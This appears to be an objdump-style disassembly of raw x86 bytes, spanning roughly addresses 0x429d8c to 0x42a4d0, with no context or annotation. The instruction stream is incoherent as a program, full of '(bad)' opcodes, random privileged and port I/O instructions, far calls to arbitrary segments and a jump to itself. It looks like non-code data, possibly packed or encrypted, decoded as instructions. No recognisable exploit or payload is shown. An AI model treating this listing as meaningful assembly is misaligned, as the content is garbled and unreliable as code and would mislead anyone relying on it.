  429d8c:	add    esp,DWORD PTR [ebx+edx*1-0x111ad21d]
  429d93:	jp     0x429dea
  429d95:	mov    esp,0x9d6aa537
  429d9a:	inc    ebp
  429d9b:	mov    ebp,0xa1a00424
  429da0:	loope  0x429db3
  429da2:	inc    ebx
  429da3:	call   eax
  429da5:	sbb    ch,dh
  429da7:	into   
  429da8:	out    dx,al
  429da9:	inc    esp
  429daa:	adc    ebx,DWORD PTR [ecx-0x54]
  429dad:	or     BYTE PTR [esi+0x1ea76a90],cl
  429db3:	and    DWORD PTR [ebp-0x806dfa],edx
  429db9:	add    ebx,edi
  429dbb:	sbb    eax,0xfeeebd34
  429dc0:	jnp    0x429e25
  429dc2:	into   
  429dc3:	hlt    
  429dc4:	pop    ss
  429dc5:	popa   
  429dc6:	mov    esi,0xc8cfbdec
  429dcb:	jge    0x429e2a
  429dcd:	pop    esp
  429dce:	es pop eax
  429dd0:	push   ss
  429dd1:	popa   
  429dd2:	mov    dh,0x3e
  429dd4:	mov    bl,0x46
  429dd6:	sbb    DWORD PTR [esi+0x1aa660a3],ebx
  429ddc:	push   ds
  429ddd:	mov    esi,0x94b8e95c
  429de2:	fucomip st,st(7)
  429de4:	pop    esi
  429de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429de6:	pop    eax
  429de7:	lods   eax,DWORD PTR ds:[esi]
  429de8:	push   0xd5c4376d
  429ded:	pusha  
  429dee:	arpl   WORD PTR ds:0xff168ac7,dx
  429df4:	xor    al,0x4a
  429df6:	out    dx,al
  429df7:	gs cmp al,0x65
  429dfa:	(bad)  
  429dfc:	mov    al,0xab
  429dfe:	or     ah,BYTE PTR [ebp+edx*4+0x6da4fecb]
  429e05:	test   al,0x32
  429e07:	fs cmp dl,dh
  429e0a:	jbe    0x429e76
  429e0c:	pop    esp
  429e0d:	std    
  429e0e:	jmp    0x429e1b
  429e10:	not    DWORD PTR [ecx]
  429e12:	aad    0x4d
  429e14:	out    dx,al
  429e15:	sar    BYTE PTR [ecx+eax*8-0x78],1
  429e19:	pusha  
  429e1a:	out    0xbb,al
  429e1c:	out    0xe6,eax
  429e1e:	and    BYTE PTR [esi],bh
  429e20:	or     edx,ecx
  429e22:	jmp    0x429e22
  429e24:	(bad)  
  429e25:	jmp    0xc0f168fb
  429e2a:	bound  ebp,QWORD PTR [ebx+edx*1]
  429e2d:	popa   
  429e2e:	test   dl,bl
  429e30:	stos   DWORD PTR es:[edi],eax
  429e31:	test   DWORD PTR [ebx-0x11ad5d6f],edi
  429e37:	outs   dx,DWORD PTR ds:[esi]
  429e38:	jg     0x429ea6
  429e3a:	ret    
  429e3b:	(bad)  
  429e3c:	sbb    BYTE PTR [edi+eiz*1],bl
  429e3f:	test   al,0xdf
  429e41:	in     eax,dx
  429e42:	and    ebx,ebx
  429e44:	push   ds
  429e45:	loope  0x429e44
  429e47:	jno    0x429e51
  429e49:	inc    esi
  429e4a:	out    dx,al
  429e4b:	inc    eax
  429e4c:	aad    0x94
  429e4e:	sbb    eax,DWORD PTR [esi-0x6795822e]
  429e54:	stos   BYTE PTR es:[edi],al
  429e55:	cwde   
  429e56:	mov    esp,DWORD PTR [ecx-0x5a1d89c8]
  429e5c:	sti    
  429e5d:	add    eax,0xffe2dfed
  429e62:	test   BYTE PTR [esi-0x16],bl
  429e65:	inc    edi
  429e66:	push   cs
  429e67:	xor    DWORD PTR [esi+0x5d],edi
  429e6a:	add    BYTE PTR [eax],bl
  429e6c:	adc    DWORD PTR [eax-0x257877a0],esi
  429e72:	mov    fs,WORD PTR [eax+0x4b]
  429e75:	aad    0x5a
  429e77:	loop   0x429ed6
  429e79:	push   ebp
  429e7a:	mov    al,dl
  429e7c:	cdq    
  429e7d:	out    0x65,al
  429e7f:	pop    edx
  429e80:	mov    bl,ch
  429e82:	mov    dl,0xcc
  429e84:	mov    ds:0x5d32b60e,al
  429e89:	stos   DWORD PTR es:[edi],eax
  429e8a:	(bad)  
  429e8b:	push   ecx
  429e8c:	ja     0x429ebb
  429e8e:	xor    DWORD PTR [ecx-0x7afd0caa],0xba2e13c7
  429e98:	push   ecx
  429e99:	xlat   BYTE PTR ds:[ebx]
  429e9a:	xchg   edx,eax
  429e9b:	sbb    al,0xfb
  429e9d:	pusha  
  429e9e:	mov    ds:0xafa10d77,al
  429ea3:	stos   BYTE PTR es:[edi],al
  429ea4:	ja     0x429f1c
  429ea6:	out    dx,al
  429ea7:	dec    edi
  429ea8:	(bad)  
  429ea9:	mov    DWORD PTR [eax+0x74],esi
  429eac:	xchg   edi,eax
  429ead:	sbb    cl,BYTE PTR [edx]
  429eaf:	(bad)  
  429eb0:	ficom  DWORD PTR [esi+eiz*8]
  429eb3:	mov    eax,ds:0x39e3d54
  429eb8:	out    0xb4,eax
  429eba:	ins    DWORD PTR es:[edi],dx
  429ebb:	stc    
  429ebc:	pop    esi
  429ebd:	sub    al,0x71
  429ebf:	stos   DWORD PTR es:[edi],eax
  429ec0:	sbb    DWORD PTR ds:0x418262f2,eax
  429ec6:	iret   
  429ec7:	inc    ebx
  429ec8:	dec    edi
  429ec9:	loope  0x429ec3
  429ecb:	in     eax,dx
  429ecc:	cli    
  429ecd:	dec    eax
  429ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ecf:	mov    bh,0x5e
  429ed1:	ficom  WORD PTR [ebx-0x3f86b84f]
  429ed7:	bound  ebp,QWORD PTR ds:0x8478ea61
  429edd:	mov    cl,0xf5
  429edf:	mov    ds,WORD PTR [ebx+ebx*2]
  429ee2:	clc    
  429ee3:	mov    bl,0x3e
  429ee5:	push   eax
  429ee6:	mov    al,ds:0x2fcb0fa1
  429eeb:	fucomip st,st(5)
  429eed:	sub    al,0xe7
  429eef:	adc    edx,esp
  429ef1:	mov    WORD PTR [ebx-0x28],?
  429ef4:	outs   dx,BYTE PTR ds:[esi]
  429ef5:	dec    ecx
  429ef6:	push   ebp
  429ef7:	push   esp
  429ef8:	sub    al,0x61
  429efa:	jge    0x429f1e
  429efc:	clc    
  429efd:	jmp    0x32ee:0xbcbabcf4
  429f04:	and    DWORD PTR [eax+0x1604408c],edx
  429f0a:	jp     0x429eb0
  429f0c:	ficomp DWORD PTR [edx+0x71b8246f]
  429f12:	push   ebx
  429f13:	aaa    
  429f14:	out    0x35,al
  429f16:	pop    ss
  429f17:	in     al,dx
  429f18:	pop    ebp
  429f19:	mov    edi,0xb320b34
  429f1e:	hlt    
  429f1f:	xor    DWORD PTR [edx+0x3a15033],edx
  429f25:	mov    ebx,0x8c92083e
  429f2a:	call   0xbfec:0xfe2a5bff
  429f31:	fcomp  DWORD PTR [esi]
  429f33:	imul   esi,DWORD PTR [edx+0x37a0184e],0xb0dcf3fc
  429f3d:	pusha  
  429f3e:	inc    edi
  429f3f:	hlt    
  429f40:	jecxz  0x429f14
  429f42:	push   cs
  429f43:	js     0x429fa3
  429f45:	mov    eax,0x8aa1897e
  429f4a:	mov    WORD PTR [ebp+0x53884995],ds
  429f50:	shl    DWORD PTR [eax-0x59],cl
  429f53:	and    dh,BYTE PTR [ecx]
  429f55:	pop    es
  429f56:	pop    ebx
  429f57:	mov    al,ds:0x26dd4f54
  429f5c:	push   ds
  429f5d:	int    0xcd
  429f5f:	pop    esp
  429f60:	addr16 sub eax,edx
  429f63:	mov    al,ds:0x25d465af
  429f68:	int    0x34
  429f6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f6b:	arpl   WORD PTR [ecx+eax*8],di
  429f6e:	mov    cl,0xad
  429f70:	pop    ebx
  429f71:	in     al,dx
  429f72:	leave  
  429f73:	std    
  429f74:	into   
  429f75:	inc    eax
  429f76:	les    eax,FWORD PTR [ebx+0x376f60fb]
  429f7c:	fwait
  429f7d:	aas    
  429f7e:	sub    esp,0x8aeb79f8
  429f84:	xchg   edx,eax
  429f85:	in     eax,dx
  429f86:	and    bh,BYTE PTR [eax]
  429f88:	test   eax,0xbd63c0c0
  429f8d:	mov    dl,0x16
  429f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429f90:	mov    ?,WORD PTR [ebp+0x76]
  429f93:	jno    0x429ff1
  429f95:	ja     0x429f3d
  429f97:	test   BYTE PTR [ebp-0x2c],0xee
  429f9b:	cmp    al,0xfd
  429f9d:	cmp    BYTE PTR [ebx+0x41],al
  429fa0:	js     0x429f50
  429fa2:	stos   DWORD PTR es:[edi],eax
  429fa3:	mov    eax,ds:0x5461e536
  429fa8:	scas   al,BYTE PTR es:[edi]
  429fa9:	stos   BYTE PTR es:[edi],al
  429faa:	or     BYTE PTR [eax],ah
  429fac:	pushf  
  429fad:	fwait
  429fae:	in     al,dx
  429faf:	loopne 0x429fec
  429fb1:	scas   al,BYTE PTR es:[edi]
  429fb2:	ins    BYTE PTR es:[edi],dx
  429fb3:	push   ss
  429fb4:	add    eax,DWORD PTR [ebx-0x7f]
  429fb7:	adc    al,0xc6
  429fb9:	and    BYTE PTR [edx],dh
  429fbb:	mov    edi,0x3c6d1992
  429fc0:	pop    ebp
  429fc1:	pop    ebp
  429fc2:	out    0x5e,al
  429fc4:	sub    al,0xaf
  429fc6:	xor    esp,esi
  429fc8:	jb     0x429fcf
  429fca:	cmp    BYTE PTR [ecx-0x3d66c187],ah
  429fd0:	jmp    0x982e:0x5e8d2065
  429fd7:	sbb    BYTE PTR [ebp-0x43],ch
  429fda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fdb:	rol    DWORD PTR [ebp+eiz*4-0x3],0xa0
  429fe0:	or     BYTE PTR [eax],cl
  429fe2:	sub    dh,al
  429fe4:	xor    BYTE PTR [ecx],al
  429fe6:	add    al,0x6a
  429fe8:	pop    esi
  429fe9:	stos   BYTE PTR es:[edi],al
  429fea:	sidtd  [eax+ebx*2]
  429fee:	fidivr DWORD PTR [ecx-0x23f29f55]
  429ff4:	jmp    0x429fbf
  429ff6:	ret    0x744f
  429ff9:	dec    ebp
  429ffa:	out    dx,al
  429ffb:	or     ah,BYTE PTR [edx]
  429ffd:	into   
  429ffe:	stc    
  429fff:	inc    edx
  42a000:	das    
  42a001:	outs   dx,DWORD PTR ds:[esi]
  42a002:	fist   WORD PTR [esi-0x60c8ee2a]
  42a008:	xchg   DWORD PTR [esi],esi
  42a00a:	scas   al,BYTE PTR es:[edi]
  42a00b:	(bad)  
  42a00c:	jmp    DWORD PTR [esi+edi*8-0x2457a193]
  42a013:	pop    esp
  42a014:	fcomi  st,st(4)
  42a016:	sub    edx,DWORD PTR [edi]
  42a018:	push   esp
  42a019:	popa   
  42a01a:	sub    eax,0x3c95d5cf
  42a01f:	sub    al,0x5c
  42a021:	(bad)  
  42a023:	and    BYTE PTR [ebx-0x64b2504d],dl
  42a029:	outs   dx,BYTE PTR ds:[esi]
  42a02a:	scas   al,BYTE PTR es:[edi]
  42a02b:	cli    
  42a02c:	sbb    al,0x68
  42a02e:	std    
  42a02f:	mov    al,ds:0xf959d9b9
  42a034:	call   0xee03:0x7ca2a01b
  42a03b:	xchg   ebx,eax
  42a03c:	dec    esi
  42a03d:	mov    dh,0x98
  42a03f:	fiadd  WORD PTR [eax+ebx*8+0x35]
  42a043:	xchg   esp,eax
  42a044:	daa    
  42a045:	sbb    bl,dl
  42a047:	pusha  
  42a048:	in     al,0xa9
  42a04a:	mov    al,0xa8
  42a04c:	pop    esi
  42a04d:	(bad)  
  42a04f:	shl    BYTE PTR [ecx-0x1],0xba
  42a053:	cmp    esp,DWORD PTR [esi+0x43441c51]
  42a059:	outs   dx,BYTE PTR fs:[esi]
  42a05b:	mov    ds:0x4c7cec07,eax
  42a060:	pop    esi
  42a061:	nop
  42a062:	daa    
  42a063:	fst    st(4)
  42a065:	jl     0x42a084
  42a067:	sbb    ch,cl
  42a069:	pop    edi
  42a06a:	cmc    
  42a06b:	ret    
  42a06c:	xchg   esp,eax
  42a06d:	rcr    ebp,cl
  42a06f:	mov    ebx,0x7e7ea4f1
  42a074:	push   ss
  42a075:	sbb    esp,DWORD PTR [eax+0x237d35a1]
  42a07b:	sbb    BYTE PTR [ecx-0x225ef2ab],ch
  42a081:	dec    esp
  42a082:	imul   DWORD PTR ds:[esi-0xbece616]
  42a089:	shr    dh,0x83
  42a08c:	xor    DWORD PTR [edi-0x31bb2ab1],ebx
  42a092:	scas   al,BYTE PTR es:[edi]
  42a093:	cdq    
  42a094:	sbb    ah,bl
  42a096:	fdiv   QWORD PTR [ecx-0x2cee45a2]
  42a09c:	lods   eax,DWORD PTR ds:[esi]
  42a09d:	repz out dx,al
  42a09f:	xchg   edi,eax
  42a0a0:	pop    edx
  42a0a1:	xchg   esp,eax
  42a0a2:	add    eax,0xfe38e8fa
  42a0a7:	lahf   
  42a0a8:	mov    al,ds:0xfd489933
  42a0ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a0ae:	in     eax,dx
  42a0af:	fstp   TBYTE PTR [edi+0x78b6b4c0]
  42a0b5:	add    DWORD PTR [eax+0x5f],ecx
  42a0b8:	pop    ebp
  42a0b9:	add    al,0x3e
  42a0bb:	jnp    0x42a099
  42a0bd:	iret   
  42a0be:	pushf  
  42a0bf:	(bad)  
  42a0c0:	out    dx,al
  42a0c1:	fistp  QWORD PTR [esi-0x58]
  42a0c4:	test   al,0x36
  42a0c6:	sbb    ebx,DWORD PTR [ebx]
  42a0c8:	clc    
  42a0c9:	push   eax
  42a0ca:	push   ebx
  42a0cb:	test   eax,0x1dee3e86
  42a0d0:	mov    bl,BYTE PTR [edx]
  42a0d2:	cdq    
  42a0d3:	mov    bh,0x2b
  42a0d5:	stc    
  42a0d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a0d7:	fcom   QWORD PTR [edi+0x77]
  42a0da:	out    0x8e,eax
  42a0dc:	xor    al,BYTE PTR [edx]
  42a0de:	adc    ecx,esp
  42a0e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a0e1:	jle    0x42a13e
  42a0e3:	repnz pop esi
  42a0e5:	mov    bh,0x51
  42a0e7:	popf   
  42a0e8:	jns    0x42a14b
  42a0ea:	mov    ah,0x33
  42a0ec:	popf   
  42a0ed:	pusha  
  42a0ee:	fcmovnbe st,st(0)
  42a0f0:	mov    bh,0x64
  42a0f2:	mov    bh,0xb2
  42a0f4:	test   al,0x55
  42a0f6:	out    dx,al
  42a0f7:	cmp    DWORD PTR [edx-0x71],ebp
  42a0fa:	mov    cl,0x79
  42a0fc:	cli    
  42a0fd:	jbe    0x42a131
  42a0ff:	mov    eax,ds:0x887b5e52
  42a104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a105:	mov    ds:0x6486f728,al
  42a10a:	adc    eax,edi
  42a10c:	outs   dx,BYTE PTR ds:[esi]
  42a10d:	add    bh,BYTE PTR [edx]
  42a10f:	mov    ds:0x166b221a,al
  42a114:	dec    eax
  42a115:	mov    cl,0xfa
  42a117:	js     0x42a13b
  42a119:	push   edi
  42a11a:	into   
  42a11b:	mov    al,ds:0x56b93b29
  42a120:	inc    ecx
  42a121:	jns    0x42a0c3
  42a123:	mov    ecx,0xa14dff4b
  42a128:	retf   0x4e44
  42a12b:	jecxz  0x42a0bb
  42a12d:	(bad)  
  42a12e:	and    edi,esp
  42a130:	pop    esi
  42a131:	adc    DWORD PTR [esi-0x21],esp
  42a134:	push   esp
  42a135:	in     eax,dx
  42a136:	push   ds
  42a137:	sub    eax,0xce35630b
  42a13c:	inc    BYTE PTR [eax+edi*1]
  42a13f:	mov    ds:0x39eeb63a,al
  42a144:	push   0x731d366b
  42a149:	cs xchg ecx,eax
  42a14b:	mov    ds:0x6c89e427,al
  42a150:	rcl    al,1
  42a152:	stos   BYTE PTR es:[edi],al
  42a153:	jl     0x42a126
  42a155:	stc    
  42a156:	dec    edx
  42a157:	(bad)  
  42a158:	pop    esi
  42a159:	push   esp
  42a15a:	dec    eax
  42a15b:	push   es
  42a15c:	nop
  42a15d:	ins    BYTE PTR es:[edi],dx
  42a15e:	outs   dx,BYTE PTR ds:[esi]
  42a15f:	add    bl,bh
  42a161:	inc    ebx
  42a162:	aas    
  42a163:	cli    
  42a164:	push   ebx
  42a165:	and    DWORD PTR [ebx],ebp
  42a167:	js     0x42a138
  42a169:	pop    esp
  42a16a:	and    dh,BYTE PTR [edi-0x17]
  42a16d:	retf   
  42a16e:	jmp    0x42a131
  42a170:	rcr    BYTE PTR [ecx+0x65],0xe3
  42a174:	sub    DWORD PTR [eax+0x6a69bff6],ebp
  42a17a:	dec    esi
  42a17b:	push   di
  42a17d:	popa   
  42a17e:	mov    eax,ds:0xce10ead6
  42a183:	nop
  42a184:	out    dx,al
  42a185:	in     eax,dx
  42a186:	in     al,dx
  42a187:	or     cl,BYTE PTR [edx+0x5a]
  42a18a:	and    esi,ecx
  42a18c:	mov    ds:0x613350a0,eax
  42a191:	xor    al,al
  42a193:	pusha  
  42a194:	push   esi
  42a195:	dec    esi
  42a196:	add    eax,0xe759bed3
  42a19b:	dec    edx
  42a19c:	and    BYTE PTR [esi],0x15
  42a19f:	mov    esi,0x5cbe04ab
  42a1a4:	pushf  
  42a1a5:	mov    WORD PTR [ecx+eiz*4+0x57],fs
  42a1a9:	jl     0x42a1b2
  42a1ab:	cmp    eax,0x9dd3195
  42a1b0:	pop    esi
  42a1b1:	lods   al,BYTE PTR ds:[esi]
  42a1b2:	inc    ecx
  42a1b3:	dec    esp
  42a1b4:	dec    esp
  42a1b5:	and    eax,0x5f7037c3
  42a1ba:	mov    edx,0xc8899684
  42a1bf:	call   0x358b2f0f
  42a1c4:	in     al,dx
  42a1c5:	sbb    bh,ch
  42a1c7:	cmp    eax,0xe112dc2e
  42a1cc:	imul   ebx,DWORD PTR [ecx-0xa],0xffffffce
  42a1d0:	out    0x60,eax
  42a1d2:	cmp    BYTE PTR [eax],dh
  42a1d4:	xchg   ebx,eax
  42a1d5:	cmp    eax,edi
  42a1d7:	and    DWORD PTR [ebx],esp
  42a1d9:	js     0x42a1c9
  42a1db:	add    ecx,edi
  42a1dd:	cmp    al,0x54
  42a1df:	ret    
  42a1e0:	int3   
  42a1e1:	adc    BYTE PTR [edx],cl
  42a1e3:	mov    ah,0xb2
  42a1e5:	push   cs
  42a1e6:	ss sbb dh,0xc8
  42a1ea:	lahf   
  42a1eb:	xchg   ecx,eax
  42a1ec:	pop    esi
  42a1ed:	dec    ebp
  42a1ee:	mov    ebx,0x78ccbad8
  42a1f3:	leave  
  42a1f4:	mov    esp,DWORD PTR [eax+0x2c]
  42a1f7:	xor    ebp,ebp
  42a1f9:	test   BYTE PTR [esi+edi*1-0x3a110147],ah
  42a200:	or     eax,0x404ada6a
  42a205:	xlat   BYTE PTR ds:[ebx]
  42a206:	xor    eax,0x2e5dd59f
  42a20b:	cmp    DWORD PTR [esi],edi
  42a20d:	sbb    eax,0xc62d5930
  42a212:	bound  esp,QWORD PTR [ebp+0x4b]
  42a215:	retf   
  42a216:	dec    edi
  42a217:	outs   dx,DWORD PTR ds:[esi]
  42a218:	push   ds
  42a219:	dec    ebx
  42a21a:	xchg   ebx,eax
  42a21b:	sbb    eax,0xa4a02628
  42a220:	fisubr DWORD PTR ds:0xe1ffc816
  42a226:	cs daa 
  42a228:	xchg   ecx,eax
  42a229:	jnp    0x42a212
  42a22b:	aaa    
  42a22c:	jl     0x42a25e
  42a22e:	ins    DWORD PTR es:[edi],dx
  42a22f:	add    bl,BYTE PTR [esi+0x53]
  42a232:	dec    esi
  42a233:	dec    ebp
  42a234:	xchg   esp,eax
  42a235:	pop    ebp
  42a236:	pop    es
  42a237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a238:	sub    bh,BYTE PTR [ebp-0x78]
  42a23b:	(bad)  
  42a23c:	xchg   bl,dl
  42a23e:	mov    bl,0x73
  42a240:	inc    edx
  42a241:	inc    ecx
  42a242:	imul   esi,DWORD PTR [edx+0x394b2c5e],0x37
  42a249:	in     al,dx
  42a24a:	aad    0xa0
  42a24c:	addr16 jne 0x42a296
  42a24f:	mov    edi,0x96d6b2e1
  42a254:	inc    edx
  42a255:	sub    eax,0xc62203e
  42a25a:	pop    es
  42a25b:	fnsave [eax]
  42a25d:	pop    edx
  42a25e:	cmp    DWORD PTR [eax+0xe],ebx
  42a261:	mov    esi,0x7c40a167
  42a266:	loop   0x42a2b2
  42a268:	pop    esi
  42a269:	jb     0x42a267
  42a26b:	or     edi,esp
  42a26d:	int    0xf1
  42a26f:	lea    edi,[ecx+eiz*2]
  42a272:	cmp    DWORD PTR [ebp-0x2],edx
  42a275:	jl     0x42a227
  42a277:	push   cs
  42a278:	sbb    BYTE PTR [edi+0x45a19eed],cl
  42a27e:	ja     0x42a289
  42a280:	mov    ebp,0xc7a0dec5
  42a285:	pop    ecx
  42a286:	fnstenv cs:[ecx]
  42a289:	inc    ebp
  42a28a:	jl     0x42a29d
  42a28c:	sub    ch,BYTE PTR [edi-0x52]
  42a28f:	test   al,0x5e
  42a291:	jg     0x42a2a4
  42a293:	xchg   edi,eax
  42a294:	jne    0x42a23a
  42a296:	fsub   st,st(7)
  42a298:	mov    edx,0x52356960
  42a29d:	mov    dh,0xfa
  42a29f:	xor    BYTE PTR [ecx+esi*2-0x57197212],dl
  42a2a6:	sub    esp,DWORD PTR [edi+0x42]
  42a2a9:	arpl   WORD PTR [ebx-0x3bd88c5f],cx
  42a2af:	lock not esi
  42a2b2:	mov    esp,0x1bf65ef9
  42a2b7:	call   0x6de367a3
  42a2bc:	test   eax,0xb56db451
  42a2c1:	mov    ah,0x8e
  42a2c3:	call   0x1862:0xa22087ad
  42a2ca:	xor    edx,DWORD PTR [eax+ecx*1-0x735ae17f]
  42a2d1:	sub    ecx,DWORD PTR [esp+edi*1]
  42a2d4:	xchg   al,ah
  42a2d6:	cmp    ch,0xa5
  42a2d9:	daa    
  42a2da:	out    dx,al
  42a2db:	das    
  42a2dc:	in     eax,dx
  42a2dd:	sbb    eax,DWORD PTR [ecx+0x48]
  42a2e0:	sbb    eax,0x6aee2e92
  42a2e5:	bound  esp,QWORD PTR [esi+esi*8-0x53918cca]
  42a2ec:	xor    BYTE PTR [ecx+eiz*1-0x16a9149a],dh
  42a2f3:	daa    
  42a2f4:	test   eax,0xde1f5cd4
  42a2f9:	scas   al,BYTE PTR es:[edi]
  42a2fa:	icebp  
  42a2fb:	lock fmul DWORD PTR [eax]
  42a2fe:	fidiv  DWORD PTR [ebx+0x5e]
  42a301:	pop    ds
  42a302:	mov    dl,0xe0
  42a304:	mov    bl,BYTE PTR [edi]
  42a306:	xor    al,0x6
  42a308:	pop    esi
  42a309:	sub    DWORD PTR [ebp+0x35febff9],ebx
  42a30f:	xor    eax,0x128a6240
  42a314:	shl    BYTE PTR ds:0x1f988cb1,1
  42a31a:	xor    BYTE PTR [ebx],cl
  42a31c:	clc    
  42a31d:	mov    ebx,0x3aae80c1
  42a322:	add    BYTE PTR [esi+0x2c6b588a],bl
  42a328:	aad    0xd3
  42a32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a32b:	js     0x42a328
  42a32d:	inc    esp
  42a32e:	jae    0x42a2d2
  42a330:	jl     0x42a397
  42a332:	cld    
  42a333:	cmp    cl,ah
  42a335:	xor    esi,DWORD PTR [ebp+0x70]
  42a338:	sahf   
  42a339:	ret    0xc7d3
  42a33c:	push   cs
  42a33d:	push   ds
  42a33e:	inc    ebp
  42a33f:	je     0x42a39f
  42a341:	int    0x4a
  42a343:	fisubr DWORD PTR [ecx+0x6e]
  42a346:	inc    ebp
  42a347:	retf   
  42a348:	inc    esp
  42a349:	jmp    0x6174b4b8
  42a34e:	sahf   
  42a34f:	test   al,0x60
  42a351:	xchg   ebx,eax
  42a352:	mov    edi,0xdfb07cfe
  42a357:	imul   edx,DWORD PTR [edx-0x60],0xffffffe9
  42a35b:	popf   
  42a35c:	push   ds
  42a35d:	mov    al,0x65
  42a35f:	cli    
  42a360:	push   edi
  42a361:	(bad)  
  42a362:	xlat   BYTE PTR ds:[ebx]
  42a363:	mov    WORD PTR [eax],?
  42a365:	sub    eax,DWORD PTR [esi]
  42a367:	imul   ebx,DWORD PTR [esi-0x2e],0x43
  42a36b:	or     al,0xbc
  42a36d:	xchg   ecx,eax
  42a36e:	popf   
  42a36f:	sbb    ebx,DWORD PTR [esi+0xb]
  42a372:	into   
  42a373:	mov    WORD PTR [edi+0x16eb916b],fs
  42a379:	inc    ebx
  42a37a:	test   eax,0xe7e8d17c
  42a37f:	fidiv  WORD PTR [ecx-0x39ae7d98]
  42a385:	xor    DWORD PTR [ebx+0x42],eax
  42a388:	pop    esi
  42a389:	xor    eax,0xb4fd5692
  42a38e:	and    eax,0xd760e18c
  42a393:	aad    0x13
  42a395:	mov    bl,0x2e
  42a397:	adc    dh,BYTE PTR [esi]
  42a399:	test   eax,0x8963f75c
  42a39e:	jmp    edi
  42a3a0:	addr16 add esp,ebx
  42a3a3:	mov    al,0x7f
  42a3a5:	popa   
  42a3a6:	xchg   esp,eax
  42a3a7:	mov    eax,ds:0x1f40d71f
  42a3ac:	test   al,0x90
  42a3ae:	fidivr DWORD PTR [ebx-0x33c692a2]
  42a3b4:	pop    eax
  42a3b5:	leave  
  42a3b6:	shl    BYTE PTR [edx],1
  42a3b8:	cwde   
  42a3b9:	pusha  
  42a3ba:	dec    esi
  42a3bb:	push   cs
  42a3bc:	out    dx,al
  42a3bd:	adc    DWORD PTR [ebx-0x11017b4d],ebp
  42a3c3:	dec    edi
  42a3c4:	icebp  
  42a3c5:	push   ecx
  42a3c6:	retf   0x25
  42a3c9:	and    esi,ecx
  42a3cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a3cc:	mov    dh,0xa4
  42a3ce:	lock mov ecx,0x659ac10d
  42a3d4:	test   BYTE PTR [esi],al
  42a3d6:	lock js 0x42a428
  42a3d9:	sub    BYTE PTR [eax],0x1
  42a3dc:	dec    ebx
  42a3dd:	lahf   
  42a3de:	inc    edx
  42a3df:	push   edx
  42a3e0:	rcr    DWORD PTR [ecx+0x3c],1
  42a3e3:	mov    edx,0x90dc539e
  42a3e8:	mov    ah,bh
  42a3ea:	jno    0x42a41f
  42a3ec:	pop    esi
  42a3ed:	aaa    
  42a3ee:	add    DWORD PTR [ebx-0x35cc3333],esp
  42a3f4:	push   ss
  42a3f5:	popa   
  42a3f6:	dec    esi
  42a3f7:	or     bh,dh
  42a3f9:	ret    0xe02c
  42a3fc:	and    eax,ebx
  42a3fe:	out    dx,al
  42a3ff:	loop   0x42a3a5
  42a401:	dec    edi
  42a402:	dec    ebx
  42a403:	jge    0x42a3a0
  42a405:	jo     0x42a482
  42a407:	mov    eax,ds:0xc1282ed9
  42a40c:	add    bh,dh
  42a40e:	sub    DWORD PTR [ecx+0x5e],edx
  42a411:	or     edi,DWORD PTR [edx+eiz*4-0x1d5cb55]
  42a418:	not    DWORD PTR [edx-0x68]
  42a41b:	leave  
  42a41c:	lock mov bl,0xce
  42a41f:	(bad)  
  42a420:	dec    ebx
  42a421:	test   al,0xed
  42a423:	rcr    DWORD PTR [esi-0x8],cl
  42a426:	dec    ecx
  42a427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a428:	inc    edi
  42a429:	cmc    
  42a42a:	adc    DWORD PTR [edi],ebx
  42a42c:	test   eax,0xc69ead60
  42a431:	cmp    BYTE PTR [eiz*8+0x66228a11],dh
  42a438:	aaa    
  42a439:	loope  0x42a415
  42a43b:	cmp    ch,BYTE PTR [ebp+eiz*8+0x5b]
  42a43f:	dec    ecx
  42a440:	and    DWORD PTR [eax-0x50],0x60
  42a444:	push   es
  42a445:	test   al,0x6a
  42a447:	add    edi,edx
  42a449:	cmp    ebp,edi
  42a44b:	xchg   edi,eax
  42a44c:	mov    dl,BYTE PTR [ebx-0x4c]
  42a44f:	and    BYTE PTR [esi],cl
  42a451:	fs fcmovne st,st(7)
  42a454:	jge    0x42a4b6
  42a456:	(bad)  
  42a457:	jge    0x42a403
  42a459:	dec    esi
  42a45a:	shl    DWORD PTR [edi+0x59],cl
  42a45d:	sub    dh,0xff
  42a460:	or     eax,0x691f6ea6
  42a465:	adc    DWORD PTR [ecx],eax
  42a467:	mov    ss,WORD PTR [eax-0x5e5eb125]
  42a46d:	ret    0x8a64
  42a470:	dec    edi
  42a471:	push   ebx
  42a472:	out    dx,eax
  42a473:	fst    DWORD PTR [edx+0x40]
  42a476:	mov    ebp,0x506074b9
  42a47b:	and    bh,bh
  42a47d:	gs clc 
  42a47f:	mov    al,ds:0xbce5774b
  42a484:	mov    BYTE PTR [ebp-0x79],cl
  42a487:	mov    bh,0x7e
  42a489:	(bad)
  42a48c:	daa    
  42a48d:	inc    esi
  42a48e:	xor    BYTE PTR [edi-0x77],bh
  42a491:	ds pop ss
  42a493:	mov    eax,ds:0x819bd8fb
  42a498:	push   cs
  42a499:	ror    BYTE PTR [ebx+ebx*4],1
  42a49c:	xor    eax,0x46a4a37a
  42a4a1:	jnp    0x42a4fa
  42a4a3:	or     al,0xf
  42a4a5:	mov    ecx,0x61189855
  42a4aa:	mov    edx,0xc8ea9069
  42a4af:	and    al,0x43
  42a4b1:	int    0xee
  42a4b3:	jp     0x42a4a5
  42a4b5:	inc    ebp
  42a4b6:	push   ebx
  42a4b7:	adc    al,0x67
  42a4b9:	push   ebx
  42a4ba:	cmp    BYTE PTR [ecx+0x38cb3146],ah
  42a4c0:	ret    
  42a4c1:	add    esi,DWORD PTR [edx-0x7c5ba0dd]
  42a4c7:	les    ebx,FWORD PTR [edx+0x3e217797]
  42a4cd:	sbb    ebx,esi
  42a4cf:	scas   eax,DWORD PTR es:[edi]
  42a4d0:	out    0xd5,al
